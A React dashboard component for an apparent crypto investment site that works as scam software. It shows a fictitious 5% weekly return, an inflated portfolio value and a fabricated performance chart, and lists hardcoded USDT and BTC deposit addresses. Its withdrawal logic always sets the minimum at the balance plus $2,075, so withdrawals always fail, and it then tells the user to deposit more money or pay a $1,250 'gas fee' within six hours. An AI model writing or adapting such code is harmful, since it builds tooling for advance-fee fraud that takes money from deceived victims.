import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Line } from "react-chartjs-2";
import {
  Chart as ChartJS,
  LineElement,
  CategoryScale,
  LinearScale,
  PointElement,
  Tooltip,
  Legend,
} from "chart.js";

ChartJS.register(
  LineElement,
  CategoryScale,
  LinearScale,
  PointElement,
  Tooltip,
  Legend
);

export default function Dashboard() {
  const navigate = useNavigate();

  const [showConfirm, setShowConfirm] = useState(false);
  const [loggingOut, setLoggingOut] = useState(false);
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  const [showDeposit, setShowDeposit] = useState(false);
  const [showWithdraw, setShowWithdraw] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [withdrawMethod, setWithdrawMethod] = useState("");
  const [lastUpdated, setLastUpdated] = useState(null);
  const [goalAmount, setGoalAmount] = useState("");
  const [showAllTx, setShowAllTx] = useState(false);

  // Fetch latest user data
  const fetchUser = async () => {
    const token = localStorage.getItem("authToken");
    if (!token) {
      setUser(null);
      setLoading(false);
      return;
    }

    try {
      const res = await fetch(
        `${process.env.REACT_APP_API_URL}/api/user/profile`,
        {
          headers: {
            Authorization: `Bearer ${token}`,
            "Content-Type": "application/json",
          },
        }
      );

      if (!res.ok) throw new Error("Failed to fetch user");
      const data = await res.json();
      setUser(data.user);
      setLastUpdated(new Date());
    } catch (err) {
      console.error("Dashboard fetch error:", err);
      setUser(null);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchUser();
  }, []);

  const formatCurrency = (v) =>
    new Intl.NumberFormat("en-US", {
      style: "currency",
      currency: "USD",
    }).format(v);

  const handleLogoutClick = () => setShowConfirm(true);
  const confirmLogout = () => {
    setLoggingOut(true);
    localStorage.removeItem("authToken");
    navigate("/");
  };
  const cancelLogout = () => setShowConfirm(false);
  const handleDeposit = () => setShowDeposit(true);
  const handleWithdraw = () => {
    if (user?.balance > 0) {
      setShowWithdraw(true);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center text-xl text-gray-700">
        Loading dashboard...
      </div>
    );
  }

  if (!user) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center text-xl text-red-600 p-4">
        Unauthorized. Please log in or sign up.
        <button
          onClick={() => navigate("/")}
          className="mt-4 px-4 py-2 bg-indigo-600 text-white rounded hover:bg-indigo-700"
        >
          Go to Login
        </button>
      </div>
    );
  }

  const weeklyEarnings = user.balance * 0.05;
  const portfolioValue = user.balance + weeklyEarnings + 233;

  // Dummy performance data
  const performanceData = {
    labels: ["Week 1", "Week 2", "Week 3", "Week 4"],
    datasets: [
      {
        label: "Portfolio Value",
        data: [
          portfolioValue * 0.8,
          portfolioValue * 0.9,
          portfolioValue * 0.95,
          portfolioValue,
        ],
        borderColor: "rgba(79, 70, 229, 1)",
        backgroundColor: "rgba(79, 70, 229, 0.2)",
        tension: 0.3,
        pointRadius: 3,
      },
    ],
  };

  return (
    <div className="min-h-screen bg-gray-100 p-4 sm:p-6">
      {/* Header */}
      <header className="bg-indigo-700 text-white p-5 rounded-lg shadow-md mb-6 flex flex-col md:flex-row md:items-center md:justify-between gap-4">
        <div>
          <h1 className="text-2xl font-bold">Dashboard</h1>
          <p className="mt-1 text-lg">Welcome back, {user.name} </p>
          {lastUpdated && (
            <p className="text-sm text-gray-200 mt-1">
              Last updated: {lastUpdated.toLocaleTimeString()}
            </p>
          )}
        </div>
        <div className="flex flex-col sm:flex-row gap-4">
          <button
            onClick={fetchUser}
            className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition"
          >
            Refresh
          </button>
          <button
            onClick={handleLogoutClick}
            disabled={loggingOut}
            className={`px-4 py-2 rounded-md font-medium transition ${
              loggingOut
                ? "bg-gray-300 text-gray-600 cursor-not-allowed"
                : "bg-white text-red-600 hover:bg-red-100"
            }`}
          >
            {loggingOut ? "Logging out..." : "Logout"}
          </button>
        </div>
      </header>

      {/* Confirm Logout Modal */}
      {showConfirm && !loggingOut && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50 p-4">
          <div className="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm text-center">
            <h2 className="text-xl font-bold mb-4">Confirm Logout</h2>
            <p className="mb-6 text-gray-700">
              Are you sure you want to log out?
            </p>
            <div className="flex justify-center gap-4">
              <button
                onClick={confirmLogout}
                className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700 transition"
              >
                Yes, Logout
              </button>
              <button
                onClick={cancelLogout}
                className="px-4 py-2 bg-gray-200 text-gray-800 rounded hover:bg-gray-300 transition"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Account Summary */}
      <section className="grid sm:grid-cols-2 md:grid-cols-3 gap-6 mb-6">
        <div className="bg-white p-6 rounded-lg shadow-md">
          <h2 className="text-gray-600 font-medium">Portfolio Value</h2>
          <p className="text-3xl font-bold text-indigo-700 mt-1">
            {formatCurrency(portfolioValue)}
          </p>
        </div>
        <div className="bg-white p-6 rounded-lg shadow-md">
          <h2 className="text-gray-600 font-medium">Available Balance</h2>
          <p className="text-3xl font-bold text-green-600 mt-1">
            {formatCurrency(user.balance)}
          </p>
        </div>
        <div className="bg-white p-6 rounded-lg shadow-md">
          <h2 className="text-gray-600 font-medium">
            Estimated Weekly Earnings
          </h2>
          <p className="text-3xl font-bold text-yellow-600 mt-1">
            {formatCurrency(weeklyEarnings)}
          </p>
          <p className="text-sm text-gray-500 mt-1">
            Based on 5% weekly return
          </p>
        </div>
      </section>

      {/* Performance Chart */}
      <section className="bg-white p-6 rounded-lg shadow-md mb-6">
        <h2 className="text-xl font-bold text-gray-800 mb-4">
          Performance Overview
        </h2>
        <div className="w-full overflow-x-auto">
          <Line
            data={performanceData}
            options={{
              responsive: true,
              maintainAspectRatio: false,
              plugins: { legend: { display: true } },
              scales: {
                y: { ticks: { callback: (v) => `$${v.toLocaleString()}` } },
              },
            }}
            height={300}
          />
        </div>
      </section>

      {/* Goals & Milestones */}
      <section className="bg-white p-6 rounded-lg shadow-md mb-6">
        <h2 className="text-xl font-bold text-gray-800 mb-4">
          Goals & Milestones
        </h2>
        <div className="flex flex-col sm:flex-row gap-4 mb-4">
          <input
            type="number"
            placeholder="Enter your goal amount"
            className="flex-1 px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-500"
            value={goalAmount}
            onChange={(e) => setGoalAmount(Number(e.target.value))}
            min={0}
          />
          <button
            onClick={() => alert(`Goal set to ${formatCurrency(goalAmount)}`)}
            className="px-6 py-2 bg-indigo-600 text-white rounded hover:bg-indigo-700 transition"
          >
            Set Goal
          </button>
        </div>

        <p className="text-gray-600 mb-2">
          Current Portfolio Value:{" "}
          <span className="font-bold text-indigo-700">
            {formatCurrency(portfolioValue)}
          </span>
        </p>
        <p className="text-gray-600 mb-2">
          Goal:{" "}
          <span className="font-bold text-green-600">
            {goalAmount > 0 ? formatCurrency(goalAmount) : "Not set"}
          </span>
        </p>

        {goalAmount > 0 && (
          <>
            <div className="w-full bg-gray-200 rounded-full h-4 mt-2">
              <div
                className="bg-green-500 h-4 rounded-full transition-all"
                style={{
                  width: `${Math.min(
                    (portfolioValue / goalAmount) * 100,
                    100
                  )}%`,
                }}
              />
            </div>
            <p className="text-sm text-gray-500 mt-2">
              {Math.min((portfolioValue / goalAmount) * 100, 100).toFixed(1)}%
              of your goal reached
            </p>
          </>
        )}
      </section>

      {/* Actions */}
      <section className="bg-white p-6 rounded-lg shadow-md mb-6 text-center">
        <h2 className="text-xl font-bold text-gray-800 mb-4">Actions</h2>
        <div className="flex flex-col sm:flex-row justify-center gap-6">
          <button
            onClick={handleDeposit}
            className="px-6 py-2 bg-green-600 text-white rounded hover:bg-green-700 transition"
          >
            Deposit
          </button>
          <button
            onClick={handleWithdraw}
            disabled={user.balance <= 0}
            className={`px-6 py-2 rounded transition ${
              user.balance <= 0
                ? "bg-gray-300 text-gray-600 cursor-not-allowed"
                : "bg-red-600 text-white hover:bg-red-700"
            }`}
          >
            Withdraw
          </button>
        </div>
      </section>

      {/* Deposit Modal */}
      {showDeposit && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50 p-4">
          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center relative">
            <button
              onClick={() => setShowDeposit(false)}
              className="absolute top-3 right-3 text-gray-500 hover:text-gray-700"
            >
              ✕
            </button>
            <h2 className="text-2xl font-bold mb-6 text-indigo-700">
              Deposit Crypto
            </h2>
            <div className="space-y-4">
              <div className="p-4 border rounded-lg bg-gray-50 text-left">
                <h3 className="text-lg font-semibold text-gray-800">
                  USDT (TRC20)
                </h3>
                <p className="text-sm text-gray-600 break-all mt-2">
                  TS93LbTrDjVSB2i13DnAnr4VSx87cQVa6a
                </p>
              </div>
              <div className="p-4 border rounded-lg bg-gray-50 text-left">
                <h3 className="text-lg font-semibold text-gray-800">BTC</h3>
                <p className="text-sm text-gray-600 break-all mt-2">
                  bc1qfavp9r7xu8xccp6jwqwdf3t3cw9m404yp2mv4r
                </p>
              </div>
            </div>
            <p className="mt-6 text-xs text-gray-500">
              Please send only the correct coin to each address.
            </p>
          </div>
        </div>
      )}

      {/* Withdraw Modal */}
      {showWithdraw && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50 p-4">
          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center relative">
            <button
              onClick={() => setShowWithdraw(false)}
              className="absolute top-3 right-3 text-gray-500 hover:text-gray-700"
            >
              ✕
            </button>
            <h2 className="text-2xl font-bold mb-6 text-indigo-700">
              Withdraw Funds
            </h2>

            {/* Method Selection */}
            <div className="mb-4 text-left">
              <label className="block text-gray-700 font-medium mb-2">
                Select Method
              </label>
              <select
                value={withdrawMethod}
                onChange={(e) => setWithdrawMethod(e.target.value)}
                className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-500"
              >
                <option value="">-- Choose --</option>
                <option value="usdt">USDT Address (TRC20)</option>
                <option value="btc">BTC Address</option>
                <option value="bank">Bank Account</option>
              </select>
            </div>

            {/* Conditional Fields */}
            {withdrawMethod === "bank" && (
              <div className="space-y-4 mb-4 text-left">
                <div>
                  <label className="block text-gray-700 font-medium mb-2">
                    Bank Name
                  </label>
                  <input
                    type="text"
                    className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-500"
                  />
                </div>
                <div>
                  <label className="block text-gray-700 font-medium mb-2">
                    Account Number
                  </label>
                  <input
                    type="number"
                    className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-500"
                  />
                </div>
                <div>
                  <label className="block text-gray-700 font-medium mb-2">
                    Routing Number
                  </label>
                  <input
                    type="number"
                    className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-500"
                  />
                </div>
              </div>
            )}

            {(withdrawMethod === "usdt" || withdrawMethod === "btc") && (
              <div className="mb-4 text-left">
                <label className="block text-gray-700 font-medium mb-2">
                  Wallet Address
                </label>
                <input
                  type="text"
                  className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-500"
                />
              </div>
            )}

            {/* Amount Input */}
            <div className="mb-4 text-left">
              <label className="block text-gray-700 font-medium mb-2">
                Amount
              </label>
              <input
                type="number"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(Number(e.target.value))}
                className="w-full px-4 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-indigo-500"
                min={user.balance + 2075} // ✅ dynamic minimum
              />
              <p className="text-xs text-gray-500 mt-1">
                Minimum withdrawal: {formatCurrency(user.balance + 2075)}
              </p>
            </div>

            {/* Confirm Button */}
            <button
              onClick={() => {
                const minimumRequired = user.balance + 2075;

                if (withdrawAmount < minimumRequired) {
                  const shortfall = minimumRequired - user.balance;
                  alert(
                    `You need to deposit ${formatCurrency(
                      shortfall
                    )} into your account so your balance reaches the minimum withdrawal amount of ${formatCurrency(
                      minimumRequired
                    )}.`
                  );
                } else if (
                  withdrawAmount >= minimumRequired &&
                  withdrawAmount > user.balance
                ) {
                  alert(
                    `You don’t have up to ${formatCurrency(
                      withdrawAmount
                    )} in your account. Your current balance is ${formatCurrency(
                      user.balance
                    )}.`
                  );
                } else {
                  alert(
                    `Withdrawal request confirmed!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
                      withdrawAmount
                    )}\n\nInstruction: Please deposit ${formatCurrency(
                      withdrawAmount * 0.02
                    )} (2% gas fee) into your own wallet address to complete the withdrawal.`
                  );
                }

                setShowWithdraw(false);
                setWithdrawAmount("");
                setWithdrawMethod("");
              }}
              className="px-6 py-2 bg-indigo-600 text-white rounded hover:bg-indigo-700 transition"
            >
              Confirm Withdrawal
            </button>

            {/* ✅ Initiate Anyway Button */}
            {user.balance > 0 && (
              <button
                onClick={() => {
                  alert(
                    `Withdrawal initiated anyway!\n\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
                      user.balance
                    )}\n\nInstruction: Please deposit $1250 as a gas fee into your account within the next 6 hours to complete the withdrawal.`
                  );
                  setShowWithdraw(false);
                  setWithdrawAmount("");
                  setWithdrawMethod("");
                }}
                className="mt-4 px-6 py-2 bg-yellow-600 text-white rounded hover:bg-yellow-700 transition"
              >
                Initiate Anyway
              </button>
            )}
          </div>
        </div>
      )}
      {/* Transactions */}
      <section className="bg-white p-6 rounded-lg shadow-md mb-6">
        <h2 className="text-xl font-bold text-gray-800 mb-4">
          Recent Transactions
        </h2>
        {user.transactions && user.transactions.length > 0 ? (
          <>
            <ul className="space-y-4">
              {(showAllTx
                ? user.transactions
                    .slice()
                    .sort((a, b) => new Date(b.date) - new Date(a.date)) // show all, newest first
                : user.transactions
                    .slice()
                    .sort((a, b) => new Date(b.date) - new Date(a.date))
                    .slice(0, 5)
              ) // show only first 5
                .map((tx, idx) => (
                  <li
                    key={idx}
                    className="flex flex-col sm:flex-row sm:items-center sm:justify-between text-sm gap-2 sm:gap-4"
                  >
                    <span className="font-medium text-gray-700">{tx.type}</span>
                    <span className="text-gray-600">
                      {formatCurrency(tx.amount)}
                    </span>
                    <span className="text-gray-500">{tx.date}</span>
                    <span
                      className={`${
                        tx.status === "completed"
                          ? "text-green-600"
                          : tx.status === "pending"
                          ? "text-yellow-600"
                          : "text-red-600"
                      }`}
                    >
                      {tx.status}
                    </span>
                  </li>
                ))}
            </ul>

            {/* Load More / Show Less Button */}
            {user.transactions.length > 5 && (
              <div className="text-center mt-4">
                <button
                  onClick={() => setShowAllTx(!showAllTx)} // ✅ toggle instead of forcing true
                  className="px-4 py-2 bg-indigo-600 text-white rounded hover:bg-indigo-700 transition"
                >
                  {showAllTx ? "Show Less" : "Load More"}
                </button>
              </div>
            )}
          </>
        ) : (
          <p className="text-gray-500 text-sm">No transactions yet</p>
        )}
      </section>
    </div>
  );
}
